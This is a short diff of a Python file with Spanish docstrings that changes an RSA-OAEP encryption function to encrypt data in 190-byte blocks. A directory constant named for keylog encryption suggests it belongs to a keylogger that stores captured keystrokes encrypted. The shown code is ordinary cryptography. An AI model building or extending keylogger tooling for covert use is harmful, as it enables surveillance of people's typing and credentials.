@@ -11,23 +11,35 @@ ENCRYPTED_DIR = os.path.join(os.path.expanduser("~"), "Documents", "keylog_encry
 
 def encrypt_data(data, public_key):
     """Cifra los datos con la llave pública usando OAEP padding.
+    Divide los datos en bloques apropiados para RSA-2048.
     ### Parameters
     1. data : bytes
         - Los datos a cifrar.
     2. public_key : cryptography.hazmat.primitives.asymmetric.rsa.RSAPublicKey
         - Llave pública RSA para cifrado.
     ### Returns
-    - None
-        - No retorna ningún valor, pero escribe los datos cifrados en un archivo.
+    - bytes
+        - Los datos cifrados concatenados.
     """
-    return public_key.encrypt(
-        data,
-        padding.OAEP(
-            mgf=padding.MGF1(algorithm=hashes.SHA256()),
-            algorithm=hashes.SHA256(),
-            label=None
+    # RSA-2048 con OAEP puede cifrar hasta ~190 bytes por bloque
+    max_chunk_size = 190
+    encrypted_blocks = []
+    
+    # Dividir datos en bloques
+    for i in range(0, len(data), max_chunk_size):
+        chunk = data[i:i + max_chunk_size]
+        encrypted_chunk = public_key.encrypt(
+            chunk,
+            padding.OAEP(
+                mgf=padding.MGF1(algorithm=hashes.SHA256()),
+                algorithm=hashes.SHA256(),
+                label=None
+            )
         )
-    )
+        encrypted_blocks.append(encrypted_chunk)
+    
+    # Concatenar todos los bloques cifrados
+    return b''.join(encrypted_blocks)
 
 def load_public_key():
     """Carga la llave pública desde un archivo PEM.
